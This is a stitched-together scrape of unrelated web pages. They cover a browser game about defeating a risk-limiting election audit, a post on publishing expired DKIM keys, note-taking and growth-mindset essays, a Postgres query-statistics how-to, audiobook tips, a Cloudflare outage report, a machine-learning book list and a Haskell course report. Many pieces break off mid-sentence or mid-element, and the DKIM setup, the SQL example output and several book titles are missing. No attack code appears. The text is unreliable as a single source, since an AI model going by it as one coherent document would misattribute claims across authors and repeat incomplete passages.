<p>Finally, do what you say you’re going to do. Find out what you didn’t know. Don’t be afraid to ask questions of your team members, spend time on the internet searching, set up your dev environment and tweak settings, brainstorm, get frustrated, and write down hypotheses that you can test out. All of these are techniques I’ve used in trying to figure things out.</p>



<p>Saying I don’t know, honestly, with a plan to remedy your ignorance, is a key part of being a software developer.</p>



<p>Sincerely, </p>



<p>Dan</p>

<![CDATA[Stealing the Election Game]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			<a href="https://www.iffycan.com/">iffycan home</a>
			
			<p>
				I watched a <a href="https://www.pbs.org/newshour/show/how-some-election-officials-are-trying-to-verify-the-vote-more-easily">report from PBS Newshour about using risk-limiting audits to validate election results.</a>  So I made a game to simulate a vote and an audit to see if it would be possible to steal an election despite the audit.  Read below for more information (including some strategies for possibly beating the game).
			</p>
			
			<p><strong>Disclaimer:</strong> I don't endorse <em>actually</em> trying to ruin any elections.  This is just a game.  And this isn't a commentary on any past, current or future elections.</p>

			<h2>Game</h2>
			<p>
				The orange candidate is slated to win this election by a narrow margin. Your goal as a fake poll worker is to get the blue candidate to win.  Do this by sabotaging the vote-counting machines—when you do, they will count all ballots as voting for blue.
			</p>
			<p>
				But be careful!  If a real poll worker sees you interfering, it's game over.  If they see a vote-counting machine count something incorrectly, they'll fix it.  And after all votes are tallied, the results will be audited to detect any fraud.
			</p>
			<ul>
				<li>Arrow keys to move</li>
				<li>Z - do stuff (e.g. press buttons, break/fix counting machine)</li>
			</ul>
	
		
		
		

		<h2>Source</h2>
		<p>
			The source for the game is available <a href="https://github.com/iffy/stealtheelection">here</a>.  It was built with the <a href="https://github.com/ftsf/nico#nico-game-framework">NICO Game Framework</a> and borrows some assets from that.
		</p>

		<h2>Research</h2>
		<p>
			Here's <a href="https://www.stat.berkeley.edu/~stark/Preprints/gentle12.pdf">a paper co-authored by the man interviewed in the report above</a>.  It describes how risk-limiting audits work.
		</p>

		<h2>Personal Research</h2>
		<p>
			The paper is pretty clear about how the audit works, but I learned a few things trying several scenarios on my own.  First of all, <code>(s - t)/50%</code> is the same as <code>2 * (s - t)</code>.  I find that math easier.
		</p>
		<ol>
			<li>Find <code>s</code> and pick <code>t</code> (read the paper for this).</li>
			<li>Start the audit with the number <code>T<sub>0</sub> = 1</code></li>
			<li>Pick a ballot at random</li>
			<li>If the ballot is for the declared winner <em>grow</em> <code>T</code> by <code>2(s - t)</code>. For example: <code>T<sub>n+1</sub> = T<sub>n</sub> * 1.05</code>.  The percent is based on the margin of victory and a chosen "tolerance".</li>
			<li>If the ballot is for the declared loser <em>shrink</em> <code>T</code> by an inverse amount (<code>2(1 - (s - t))</code>).  For example: <code>T<sub>n+1</sub> = T<sub>n</sub> * 0.95</code></li>
			<li>If <code>T</code> grows sufficiently large (~10), the declared winner is probably not wrong. (I'm still not certain what the actual guarantees are in this case. The paper tries to emphasize that the audit won't guarantee the declared winner is <em>correct</em>, but rather will show when a declared winner is <em>incorrect</em>.</li>
			<li>If <code>T</code> shrinks sufficiently small (~0.01), the declared winner is probably wrong.</li>
		</ol>

		<h2>Winning</h2>
		<p>
			So how do you beat the game?  I haven't beaten it yet.  Don't ask me :)  But here are some thoughts:
		</p>
		<p>
			The value <code>s</code> is the percent of the vote the declared winner got.  So if blue wins with 65% of the vote, <code>s = 0.65</code>.
		</p>
		<p>
			In the best case (for a blue saboteur), the audit will pick <em>only</em> votes for blue.  The minimum number of votes you need to pass the audit is inversely dependent on <code>s</code> and directly dependent on <code>t</code>.  Here's <a href="https://docs.google.com/spreadsheets/d/1P0_GGEs6DI5d1do9NkJSRGUrrB81kGsNvXi9ke4MiJQ/edit?usp=sharing">a spreadsheet where I played with some numbers.</a>
			For example, if the declared winner got 60% of the vote, and the tolerance is 5%, the best case scenario (for a saboteur) is the first 24 ballots audited being for the (false) winner.  This is summarized in the first example in the list below:
		</p>
		<ul>
			<li><code>s = 0.60; t = 0.05</code>, minimum ballots to win: 24.</li>
			<li><code>s = 0.60; t = 0</code>, minimum ballots to win: 13</li>
			<li><code>s = 0.65; t = 0</code>, minimum ballots to win: 9</li>
		</ul>

		<p>So a good strategy would be to get the highest margin of fraudulent victory you can with the lowest tolerance possible.  <strong>However</strong>, high <code>s</code> and low <code>t</code> cuts both ways.  The scenario also reduces the number of ballots needed to fail the audit.
		</p>

		<p>Also, in real life, I would expect an unexpectedly high margin of victory to cause people to do extra audits.  So what you learn from doing this game may not apply to real life.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"> <p>If you’re like most people, there’s a good chance that it’s been years since you’ve sent an email that wasn’t cryptographically signed. You don’t use PGP, you say? Well, even if <em>you</em> are not signing your email, your provider is almost certainly doing it for you. Plausible deniability has been tossed aside in the name of stopping spam, but it doesn’t have to be.</p> <p><span data-title="DomainKeys Identified Mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></span>, originally standardized in 2007 by <a href="http://tools.ietf.org/html/rfc4871.html">RFC 4871</a>, now has near universal<a href="#id4" id="id1">[1]</a> adoption. To quote the RFC, the goal behind the protocol is to “permit a signing domain to assert responsibility for a message, thus protecting message signer identity and the integrity of the messages they convey”. It’s one of several technologies used prevent the sender identity information in email from being spoofed<a href="#id5" id="id2">[2]</a>. Anti-spam systems use it to help determine whether to consider the reputation of a domain name when making a processing decision.</p> <p>While <abbr title="DomainKeys Identified Mail">DKIM</abbr> was designed to be useful for spam prevention, the cryptographic signatures it uses have quietly made a property called “<a href="https://en.wikipedia.org/wiki/Non-repudiation">non-repudiation</a>” the new normal for email. The term is used in in contract law — for example if someone claims “that’s not my signature”, they could be said to be “repudiating” the authenticity of the document. In the case of email, the impact is that if you have a copy of an email in its original format including full headers (for example, an email spool dump) you can check the signature. The extent to which this is a reliable means of verification varies depending on the circumstances — keys short enough to be cracked used to be common, and in some cases straight-up theft of the private keys is plausible.</p> <p>Meanwhile, secure messaging tools like <a href="https://en.wikipedia.org/wiki/Off-the-Record_Messaging">OTR</a> and its successors have taken the approach of explicitly providing “deniable encryption”. The <a href="https://signal.org/blog/simplifying-otr-deniability/#potential-simplifications-and-improvements">state of the art</a> allows a sender, given a recipient’s public key, to craft a fake transcript apparently between the two of them that will pass cryptographic checks. This is generally fine for users of these apps because they know what they said. To the best of my knowledge, there is nowhere this creates a legal “get out of jail free” card. All it really does is ensure the users of these tools aren’t <em>reducing</em> their deniability by using the tool. This is an issue where <abbr title="DomainKeys Identified Mail">DKIM</abbr> really fails its users, and I’m apparently not the only one that feels this way.</p> <blockquote> <p>Apropos of nothing, I really wish Gmail would start publishing its expired DKIM secret keys.</p> <p>—<a href="https://twitter.com/matthew_d_green/status/1323011619069321216">Matthew Green</a></p> </blockquote> <p>A little over three years ago, I started doing exactly that for my domain.

</code></pre></div> <p>When I originally set this up, I was a bit concerned that I’d run into issues with filtering systems trying to validate my sent emails significantly after delivery. Per the RFC:</p> <blockquote> A signer should not sign with a private key when the selector containing the corresponding public key is expected to be revoked or removed before the verifier has an opportunity to validate the signature. The signer should anticipate that verifiers may choose to defer validation, perhaps until the message is actually read by the final recipient. In particular, when rotating to a new key pair, signing should immediately commence with the new private key and the old public key should be retained for a reasonable validation interval before being removed from the key server.</blockquote> <p>In the process of writing this up, I went through the 24 months of query logs I have. With very few exceptions (most of which were probably my own testing) there were no lookups against selectors other than on the day they were being used, so this doesn’t seem to be a problem in practice.</p> <p>I alluded to it earlier, but I want to be clear — publishing <abbr title="DomainKeys Identified Mail">DKIM</abbr> private keys like this mainly addresses leaks as a threat model. In a legal dispute, mail server logs and/or stored mail can be subpoenaed if the authenticity of messages is in question. Even in my case, where I have my own mail server on dedicated hardware with full disk encryption at an undisclosed location, most mail I send will be delivered to a server operated by a third party with no incentive to alter logs at the behest of the recipient.</p> <p>It would make for a fascinating experiment for one of the privacy focused email providers to try deploying a key management strategy similar to the one I’ve described in this post.</p> <table id="id4"> <colgroup><col><col></colgroup> <tbody> <tr><td><a href="#id1">[1]</a></td><td>I can’t find any recent public data on this, but Google reported that 87.6% of non-spam emails received by Gmail users had valid DKIM signatures as of Febuary 2016. <a href="https://security.googleblog.com/2013/12/internet-wide-efforts-to-fight-email.html">https://security.googleblog.com/2013/12/internet-wide-efforts-to-fight-email.html</a></td></tr> </tbody> </table> <table id="id5"> <colgroup><col><col></colgroup> <tbody> <tr><td><a href="#id2">[2]</a></td><td>The core protocol behind email, <span data-title="Simple Mail Transfer Protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></span> was designed in the early eighties, and one of the terms it uses is “envelope sender”.

<p>2020-11-01</p>

<p>Of the books that you have read in full more than a year ago, how much of their content can you remember on top of your head right now? As discussed in the <a href="https://freakonomics.com/podcast/nsq-books-influence/">No Stupid Questions Podcast</a>, we are more likely to remember how a book made us feel, where we bought that book, or even some special circumstance related to it (such as being gifted), than <em>its actual main points</em>.</p>

<p>While remembering plot points is arguably not important for books read for entertainment (the quote "I envy the ones who have not read book X, because they get to experience it for the first time" comes to mind), I would argue that the whole point of reading non-fiction books is to become more knowledgeable. This requires us, at the very least, to retrieve the facts we've learned and, hopefully, being able to articulate them with other facts we know or come to know.</p>

<p>Upon reading the <a href="https://www.amazon.com/dp/B06WVYW33Y">How to Take Smart Notes</a> book by Sonke Ahrens, which outlines the <em>Zettelkasten</em> method of note-taking for academic and non-fiction writing, and the <a href="https://www.amazon.com/dp/B07K6MF8MD">Ultralearning</a> book by Scott Young, which lays out the author's principles for mastery of a given subject through intense effort and focus, I've come to believe that the most important thing to remember what we've read is <em>writing</em>.</p>

<p>As the research into deliberate practice by Anders Ericsson has shown, we're terrible judges for how well we are learning something. We usually equate ease with performing well, so activities that require less effort, such as passively rereading, <em>feel</em> more productive than activities that require more effort, such as testing yourself on what you've learned. Systematic testing afterwards show that the former kind of practice, the <em>effortful</em> practice, performs much better than the latter.</p>

<p>I would argue that while reading through a 200-page book may <em>feel</em> productive, the upside afterwards, for which we set retrieval as the lowest bar, may be small, or smaller than it can be if we adopt some complementary techniques. By simply passively reading, we may fall prey to the <em>illusion of fluency</em>, which means that, while the information is still fresh in our minds, we <em>feel</em> like we master it.</p>

<p>The antidote to the illusion of mastery is, of course, <em>testing</em> yourself. But we can't make this too hard (or we will likely end up not doing it at all or for long). The simplest form of testing is, after you read a chapter, to <em>retrieve</em> from memory the gist of it and the most important points <em>for you</em>, ultimately <em>writing those down in your own words</em>.</p>

<p>By retrieving from memory instead of looking up in the book we practice <em><a href="https://en.wikipedia.org/wiki/Active_recall">active recall</a></em>, which doubles as a self-testing method and a way to strengthen our ability to retrieve that information later. If we fail to recall the main points of a chapter after we've just read it, we likely weren't paying that much attention and we won't be able to recall anything at all in the future.</p>

<p>By focusing on the points that are personally important <em>to you</em>, we ensure that we are not simply becoming able to summarize everything about a book (like a encyclopedia that can be looked up), but we are compounding upon our existing knowledge in ways that interest us and that are more likely to be useful for us in the future.</p>

<p>Finally, and arguably the most important, by writing down in our own words, instead of highlighting or copying quotes, we ensure that we are actively engaged in the concepts we are reading and we test that we are able to articulate those concepts in a coherent manner. By doing this, it is very hard to fool ourselves about our level of competency in that subject (or at least harder than it would be by doing all of this in our own mind).</p>

<p>So what do you remember from this blog post? How this may be important to you by shaping your actions in the future? Don't skip writing it down. :)</p>

<p>2020-10-26</p>

<p>The <em>Growth Mindset</em> research is one of the most impacting developments of cognitive psychology. Spearheaded by the decades of research of the psychologist Carol Dweck, it reveals how our <em>beliefs</em> about intelligence and skill shape our performance.</p>

<p>This research brilliantly sidesteps the long debate of "nature vs nurture", or how much are our intelligence, talent or skill brought up by our intrinsic genes or by our extrinsic environment and actions. The focus is on the <em>belief</em> itself that the individual holds.</p>

<p>Dweck has shown that individuals with a <em>Growth Mindset</em>, that believe that intelligence can be developed and skill is acquired through effortful practice, end up being more successful. This happens because such individuals tend to embrace challenges, push out of their zone of comfort and accept negative feedback.</p>

<p>On the other hand, individuals with a <em>Fixed Mindset</em>, that believe that intelligence is bestowed upon birth and not developed thereafter, end up being less successful. They tend to deal worse with setbacks, seeing failures as permanent testaments of their limitations. Because of this, they tend to avoid new situations and challenges above their level of skill. As a self-fulfilling prophecy, they end up not further developing their skills.</p>

<p>Dweck has also shown that we are strongly biased towards a Fixed Mindset, but with conscious effort it is possible to rewire ourselves to be more oriented towards a Growth Mindset. The psychologist has urged parents and teachers to instill in kids a Growth Mindset by praising the effort they put in instead of seemingly natural intelligence or talent.</p>

<p>The book <a href="https://www.amazon.com/gp/product/B000FCKPHG/">"Mindset: The New Psychology of Success"</a> is a great read and goes into details of how the Growth Mindset was studied and how one can become more growth-oriented.</p>

<p><strong>30/10/2020</strong></p>

<p>Getting basic insights into query performance is easy with the <code>pg_stat_statements</code> module. For applications that use postgres, being able to see min/max/avg query times can help track down non-performing queries that might otherwise be missed by other means. Keep in mind there is a <a href="http://pgsnaga.blogspot.com/2011/10/performance-impact-of-pgstatstatements.html">performance impact</a> of enabling <code>pg_stat_statements</code>.</p>

<p>Add <code>pg_stat_statements</code> to the <code>shared_preload_libraries</code> in postgres.conf</p>

<pre><code>shared_preload_libraries = 'pg_stat_statements'
</code></pre>

<p>Find out where your postgres file is:</p>

<pre><code>SHOW config_file;

-- /usr/local/var/postgres/postgresql.conf
</code></pre>

<p>Restart postgres.</p>

<p>Connect to a specific database and create the extension.</p>

<pre><code>CREATE EXTENSION pg_stat_statements;
</code></pre>

<p>Once enabled postgres will start collecting statistics for sql statements.</p>

<p>Some useful queries:</p>

<pre><code>SELECT
    calls,
    ROUND(total_time::numeric, 2) as total,
    ROUND(max_time::numeric, 2) as max,
    ROUND(mean_time::numeric, 2) as mean,
    left(query, 50) as query
FROM
    pg_stat_statements
ORDER BY
    max_time DESC
LIMIT
    10;
</code></pre>

<pre><code>SELECT
    calls,
    ROUND(total_time::numeric, 2) as total,
    ROUND(max_time::numeric, 2) as max,
    ROUND(mean_time::numeric, 2) as mean,
    left(query, 50) as query
FROM
    pg_stat_statements
ORDER BY
    total_time DESC
LIMIT
    10;
</code></pre>

<p>Example output:</p>

<pre><code>calls|total  |max    |mean   |query                                             |

Or is just something extra to put out there--you are indifferent towards how much money it makes?&nbsp;<br></li></ol><h2><strong>How long will it take to narrate my Ebook?</strong></h2><p>According to <a href="https://audible-acx.custhelp.com/app/answers/detail/a_id/6646/~/how-long-does-it-usually-take-someone-to-produce-1-finished-hour-of-an">ACX</a>, it will take about two hours to narrate one hour of finished audio. For this stat, it’s important to note that ACX assumes the average rate of words narrated in an hour is 9,300 or 155 words per minute. Taking this into consideration, a 60,000-word novel would take 6.5 hours to complete at the rate previously mentioned. Books that are under 10,000 words (less than 40 pages) read at the same 9,300 words per hour, would take 1.1 hours to narrate.&nbsp;<br></p><h2><strong>How long will it take to edit my audiobook?</strong></h2><p>This will depend on a few factors. First, are you new to editing audio? If so, it may take a little bit to adjust to how to edit. Second, which platform are you using? Some platforms are more user-friendly than others. Play around with a few before deciding which one is best for you. Lastly, do you take 5-second pauses or have another method in place to denote in your waveforms when you’ve messed up and then restarted? If not, think about adding this in to make your life easier when editing. <a href="https://audible-acx.custhelp.com/app/answers/detail/a_id/6646/~/how-long-does-it-usually-take-someone-to-produce-1-finished-hour-of-an">ACX </a>found that in order to produce one hour of finished audio content, it will take the average editor three hours. Keep this in mind.&nbsp;<br></p><h2><strong>What format does my audio need to be in?</strong></h2><p>The most common audio formats are WAV, MP3, and M4B files. Some programs may vary in if they prefer one over the other, but generally speaking, these are acceptable formats. Quick tip, if using a program such as Audacity to edit and record, you will need to ‘export’ your audio to one of these formats. Audacity keeps files saved as .aup, which is not a format these programs can read.&nbsp;<br></p><h2><strong>How much will it cost me in total to produce my audiobook?</strong></h2><p>If you’re choosing to narrate and edit your course on your own, the total will come down to a whopping zero. This is assuming you already have a decent microphone, working computer (or access to one), and a quiet space to record. Other than these things, you don’t need much else in order to be successful in this process.&nbsp;<br></p><h2><strong>11 tips for recording the perfect audiobook</strong></h2><ul role="list"><li>Sit still<strong>. </strong>The microphone will capture the extra noise of you moving around or fidgeting with your pen.</li><li>Keep the microphone in one place and watch your positioning as you record.<strong> </strong>You don’t want to move further or closer throughout the recording to affect the audio sound volume.</li><li>Read from an electronic device so you don’t have to move papers.</li><li>Practice any tongue twister statements or words ahead of time that may cause you to stumble when recording.</li><li>Record for no more than 2.5-3 hours at a time. After this, most narrators will get tired and start to lose their voices. You will save yourself the headache of having to edit or re-do sections.&nbsp;</li><li>Read at a normal pace. Think about it as if you were having a conversation with someone.</li><li>Stand up while you’re recording. It will help you breathe better and causes you to be more energetic.</li><li>Have water, tea, or other clear liquids available to stay hydrated. Try and avoid carbonated beverages or those that may causes issues.</li><li>Start with a 10-second silence at the beginning of your recording. Helpful for filling in gaps later on or hearing the background noise that gets picked up by the microphone.</li><li>Use a system to mark your mistakes. For example, this could be a 5-second pause that allows you to easily edit the audio by denoting where you messed up and can easily snip it out.&nbsp;</li><li>Enunciate. Be sure the listener can understand what you’re saying.</li></ul></div></div><div><div><h5>Continue Reading</h5><div><div role="list"><div role="listitem"><a href="https://www.avocadoaudio.com/post/avocado-vs-audible-acx"><p><img src="https://uploads-ssl.webflow.com/5eb1831614ef9185bd452478/5fa2f3ed2c66e340bbbaddae_andre-hunter-EHLbBpuZWVQ-unsplash.jpg" alt=""></p></a></div></div></div></div></div></div></div></div>]]>

									<ul>
<li><span>“When we are interviewing for a new job or taking someone on a date, a healthy mind doesn’t force us to listen to inner voices that insist on our unworthiness. It allows us to talk to ourselves as we would to a friend.” — TSOL&nbsp;</span></li>
<li><span>“At the same time, a healthy mind resists the pull of unfair comparisons. It doesn’t constantly allow the achievements and successes of others to throw us off course and reduce us to a state of bitter inadequacy. It doesn’t torture us by continually comparing our condition to that of people who have, in reality, had very different upbringings and trajectories through life. A well-functioning mind recognizes the futility and cruelty of constantly finding fault with its own nature.” — TSOL&nbsp;</span></li>
<li><span>“A healthy mind avoids catastrophic imaginings. But it has a good sense of the distinction between what could conceivably happen and what is in fact likely to happen – and it is able to leave us in peace as regards the wilder eventualities of fate, confident that awful things will either not unfold or could be dealt with ably enough if ever they did so.” — TSOL&nbsp;</span></li>
<li><span>“Aberrant thoughts about jumping on a train line or harming oneself with a sharp knife can remain brief peculiar flashes rather than repetitive fixations. A healthy mind has mastered the techniques of censorship.” — TSOL</span></li>
<li><span>“The healthy mind knows how to bracket negativity in the name of endurance. It clings to evidence of what is still beautiful and kind. It remembers to appreciate [the smallest of things].”&nbsp; — TSOL</span></li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><a href="https://cloudflare.com/" target="_blank" rel="noopener">Cloudflare</a>, a popular platform used by many websites to protect from DDOS attacks, has been having an outage/bug that is making their service inaccessible for most users.</p>
<p>Even though the websites protected by Cloudflare doesn’t seem to be affected at the moment, users are having difficulties logging in to their service and making changes to Cloudflare settings.</p>
<p>I faced the problem when I tried to log in to the Cloudflare dashboard to change DNS settings on one of my websites.</p>
<p>First, I was unable to login as the login page initially didn’t load at all. Initially, I thought it might be due to a problem with my internet connection.</p>
<p>Then even though the login page loaded, I was unable to login because I was getting some wired errors such as an error connecting to their database, which meant that they are having an issue in their backend.</p>
<p>An hour later, I made it to the dashboard, but I was unable to make any DNS changes to my website. I continued to get error messages such as, <strong>‘Internal authentication error: internal server error (Code: 10000)’</strong></p>
<figure><img src="https://aws1.discourse-cdn.com/cloudflare/original/3X/2/4/24be3416932d17d97b3bb0bc39c91b4b54147d95.png?is-pending-load=1" alt="Many Cloudflare users were complaining of getting an 'Internal authentication error: internal server error (Code: 10000)'" data-lazy-src="https://aws1.discourse-cdn.com/cloudflare/original/3X/2/4/24be3416932d17d97b3bb0bc39c91b4b54147d95.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Many users were complaining of getting an ‘Internal authentication error: internal server error (Code: 10000)’</figcaption></figure>
<p>Even though the <a href="https://www.cloudflarestatus.com/" target="_blank" rel="noopener">Cloudflare status page</a> showed that everything was working accordingly, after checking their <a href="https://community.cloudflare.com/t/dashboard-incident-discussion-11-02/218914" target="_blank" rel="noopener">community forum</a>, I saw that the issue is not an isolated issue to me, but an issue faced by many Cloudflare users.</p>
<p>A recent Cloudflare outage back in July caused thousands of websites including, Hulu, Discord, Feedly, to go offline.</p>
<h2>What to do in the time of Cloudflare outage?</h2>
<p>It seems at the time I finished writing this, Cloudflare has identified the issue and fixing it. So it’s better to wait and let Cloudflare fix the issue, and try to login again to your Cloudflare dashboard to change any of the settings.</p>

  <p>awhile ago i posted
   <a href="http://matpalm.com/blog/2010/08/06/my-list-of-cool-machine-learning-books/">my list of cool machine learning books</a>,
   but it's been awhile so it's probably time to update it...

   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/mml.jpg"></p>
<p><b><a href="https://mml-book.github.io/">Mathematics for Machine Learning</a>
   by Marc Peter Deisenroth, A. Aldo Faisal &amp; Cheng Soon Ong.</b>
</p>
<p>this is my personal favorite book on the general math required for machine learning,
   the way things are described really resonate with me.
   available as a free pdf but i got a paper copy to support the authors after reading the
   first half.

<p><b><a href="http://math.mit.edu/~gs/learningfromdata/">Linear Algebra and Learning from Data</a>
   by Gilbert Strang.</b>
</p>
<p>this is gilbert's most recent work. it's really great, he's such a good teacher, and
   <a href="https://ocw.mit.edu/courses/mathematics/18-065-matrix-methods-in-data-analysis-signal-processing-and-machine-learning-spring-2018/">his freely available lectures</a>
   are even better. it's a shorter text than his other classic intro below with
   more of a focus on how things are connected to modern machine learning techniques.
</p>

<p><b><a href="https://math.mit.edu/~gs/linearalgebra/">Introduction to Linear Algebra</a>
   by Gilbert Strang.</b>
</p>
<p>this was my favorite linear algebra book for a long time before his 'learning from
   data' came out. this is a larger book with a more comprehensive view of linear algebra.
</p>

<p><b><a href="https://greenteapress.com/wp/think-stats-2e/">Think Stats: Probability and Statistics for Programmers</a> by Allen Downey.</b>
</p>
<p>this book focuses on practical computation methods for probability and statistics.
   i got a lot out of working through this one.
   it's all in python and available for free.
   ( exciting update! as part of writing this post i've discovered there's a new edition
   to read!)
</p>

   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/dbda.jpg"></p>
<p><b><a href="https://sites.google.com/site/doingbayesiandataanalysis/">Doing Bayesian Data Analysis</a>
   by John Kruscgke</b>
</p>
<p>on the bayesian side of things this is the book i've most enjoyed working through.
   i've only got the first edition which was R and
   <a href="https://en.wikipedia.org/wiki/OpenBUGS">BUGS</a> but i see
   the second edition is R,
   <a href="http://mcmc-jags.sourceforge.net/">JAGS</a> and
   <a href="https://mc-stan.org/">Stan</a>.
   it'd be fun i'm sure to work through it doing
   everything in <a href="https://github.com/pyro-ppl/numpyro">numpyro</a>. i might do that in all
   my free time. haha. "free time" hahaha. sob.

<p><b><a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a>
   by Hastie, Tibshirani and Friedman</b>
</p>
<p>this is still one of the most amazing fundamental machine learning books i've ever had.
   in fact i've purchased this book <em>twice</em> and given it away both times :/ i might buy another
   copy some time soon, even though it's been freely available to download for ages. an
   amazing piece of work.

   <a href="https://mitpress.mit.edu/books/probabilistic-graphical-models">Probabilistic Graphical Models</a>
   by Daphne Koller &amp; Nir Friedman</b>
</p>
<p>this is an epic textbook that i'd love to understand better. i've read a couple of sections in
   detail but not the entire tome yet.

   <a href="https://www.microsoft.com/en-us/research/people/cmbishop/prml-book/">Pattern Recognition and Machine Learning</a>
   by Christopher Bishop</b>
</p>
<p>this is probably the best overall machine learning text book i've ever read. such a beautiful book
   and <a href="https://www.microsoft.com/en-us/research/uploads/prod/2006/01/Bishop-Pattern-Recognition-and-Machine-Learning-2006.pdf">the pdf is FREE FOR DOWNLOAD!!!</a>

<p><b><a href="https://mitpress.mit.edu/books/machine-learning-1">Machine Learning: A Probabilistic Perspective</a> by Kevin Murphy</b>
</p>
<p>this is my second favorite general theory text on machine learning.
   i got kevin to sign my copy when he was passing my desk once but
   someone borrowed it and never gave it back :(
   so if you see a copy with my name on the spine let me know!

<p><b><a href="https://www.oreilly.com/library/view/hands-on-machine-learning/9781492032632/">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow</a> by Aurélien Géron</b>
</p>
<p>this is the book i point most people to when they are interested in getting up
   to speed with modern applied machine learning without too much concern for the
   theory. it's very up to date (as much as a book can be) with the latest libraries
   and, most importantly, provides a good overview of not just neural stuff but fundamental
   <a href="https://scikit-learn.org/stable/">scikit-learn</a> as well.
</p>

   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/mle.jpg"></p>
<p><b><a href="http://www.mlebook.com/wiki/doku.php">Machine Learning Engineering</a> by Andriy Burkov</b>
</p>
<p>a great book focussing on the operations side of running a machine learning system. i'm a bit
   under half way through the free online version and very likely to buy a physical copy to finish
   it and support the author. great stuff and, in many ways, a more impactful book than any of
   the theory books here.

<p><b><a href="https://www-users.cs.umn.edu/~kumar001/dmbook/index.php">Introduction to Data Mining</a>
   by Pang-Ning Tan, Michael Steinbach &amp; Vipin Kumar</b>
</p>
<p>this is another one that was also on my list from ten years ago and though it's section
   on neural networks is a bit of chuckle these days there is still a bunch of really
   great fundamental stuff in this book. very practical and easy to digest. i also see there's
   a second edition now. i reckon this would compliment the "hands on" book above very well.

<p><b><a href="https://web.stanford.edu/~jurafsky/slp3/">Speech and Language Processing</a>
   by Dan Jurafsky &amp; James Martin</b>
</p>
<p>still the best overview of NLP there is (IMHO). can't wait to read the 3rd edition which
   apparently will cover more modern stuff (e.g. transformers) but until then, for the
   love of god though, please don't be one of those "this entire book is
   irrelevant now! just fine tune BERT" people :/

<p><b><a href="https://link.springer.com/book/10.1007/978-0-387-40065-5">Numerical Optimization</a>
   by Jorge NocedalStephen J. Wright</b>
</p>
<p>this book is super hard core and maybe more an operations
   research book than machine learning. though i've not read it cover to cover the
   couple of bits i've worked through really taught me a lot. i'd love to understand
   the stuff in this text better; it's so so fundamental to machine learning (and more)

</p>
<p>writing a book specifically on deep learning is very dangerous since things move so fast but
   if anyone can do it, ian can... i think ian's approach to explaining neural networks
   from the ground up is one of my favorites. i got the first edition hardback but it's free to
   download from the website.

</p>
<p>when i first joined a robotics group i bought a stack of ML/robotics books and this
   was by far the best. it's good intro stuff, and maybe already dated in places given
   it's age (the 2006 edition i have) but i still got a bunch from it.

          <div>
              <div>
              <p>This blog post is our experience report and summary after working on <a href="https://github.com/kowainik/Learn4Haskell">Learn4Haskell</a> — an educational project that took place within Hacktoberfest2020.</p>
<p>It was an exhilarating time for us, and we hope that participants feel the same way. We learned valuable lessons about the event mechanics with our new approach to it. Moreover, we discovered lots of interesting insights that could be helpful and interesting to everyone involved or those who are planning to start similar courses for Hacktoberfest.</p>
<p>In this writing, we are going to describe the GitHub course project we offered to work at as a part of Hacktoberfest, share our journey as maintainers and mentors, identify problems that beginners experience with the course based on our practice of reviewing their solutions. And we will also discuss some moral sides of experiencing such an adventure.</p>
<p>Additionally, we describe pros and cons of using Haskell in the educational field: high-grade parts that make developing and teaching in it enjoyable, as well as some language shortcomings that make newcomers (and sometimes educators) struggle with the language.</p>
<p>The blog post might be interesting for people who are</p>
<ul>
<li>curious about open-source education, GitHub project courses</li>
<li>looking for ways to make “known as difficult-to-learn” tools more accessible</li>
<li>probably compiler developers and language designers who would love to make the programming languages more approachable</li>
<li>interested in creating similar courses in the upcoming Hacktoberfests</li>
<li>interested to see statistics (lots of numbers and charts!)</li>
<li>and everyone else who would love to hear the story from our side of the barricade!</li>
</ul>
<h2 id="brave-new-hacktoberfest">Brave New Hacktoberfest<a href="#brave-new-hacktoberfest">🔗</a></h2>
<p>Hacktoberfest is an annual event to encourage open-source contributions. This year it is presented by <a href="https://www.digitalocean.com/">DigitalOcean</a>, <a href="https://hacktoberfest.digitalocean.com/intel.pdf">Intel</a> and <a href="https://github.com/forem/forem">Dev.to</a>.</p>
<p>We participate in Hacktoberfest steadily four years in a row, and this year is no exception! For 2020 Kowainik prepared a special project that puts together a lot of thoughts and goals we have for our organisation. We are happy to present to you Learn4Haskell — a beginner-friendly Haskell course.</p>
<ul>
<li><a href="https://github.com/kowainik/Learn4Haskell">kowainik/Learn4Haskell</a></li>
</ul>
<p>The idea behind Learn4Haskell is simple yet absolutely novel for Hacktoberfest. Usually, for this event, lots of incredible people donate their time and forces to improve some open-source projects. And this is a beautiful initiative!</p>
<p>Most of the time during the year developers work on private work projects, and Hacktoberfest is a perfect opportunity to pay back to communities that produce open-source stuff that is used anywhere. However, this year there were fewer opportunities to do that as Hacktoberfest became an opt-in event. Moreover, contributing to other projects is not an easy activity and could require much more time and mental efforts to get a job done.</p>
<p>So we came up with the idea to utilise the hype around Hacktoberfest and use it for a good deed. Instead of trying to make people contribute to <em>our</em> projects, we’ve offered them a way to spend that time on <em>their</em> self-improvement and education.</p>
<p>To successfully complete Hacktoberfest, you need to submit four valid <strong>pull requests (PRs)</strong>. Thus we designed a 4-step course where you can learn Haskell basics and finish Hacktoberfest simultaneously.</p>
<p>The course is a complete working Haskell project. At the same time, it is split into four independent chapters — four source code files, which makes it perfect for GitHub PR system. Each part is a working module that contains learning material and tasks you need to solve to pump your knowledge. Our chapters describe Haskell from basic syntax and simple functions to Monads. The course doesn’t require reading any other materials or guides. So you can just open a source code file in your favourite editor and start learning. Nothing else is needed except the willingness to explore Haskell!</p>
<h2 id="goals">Goals<a href="#goals">🔗</a></h2>
<p>While working on education material, it is easy to get lost and to overcomplicate it (or make it uninteresting to follow). We aimed to find the perfect balance between the minimal necessary content to fulfil the basic essential knowledge for <strong>Functional Programming (FP)</strong> paradigms and the right amount of work for people to be able to finish it by working on the course only a few hours a day.</p>
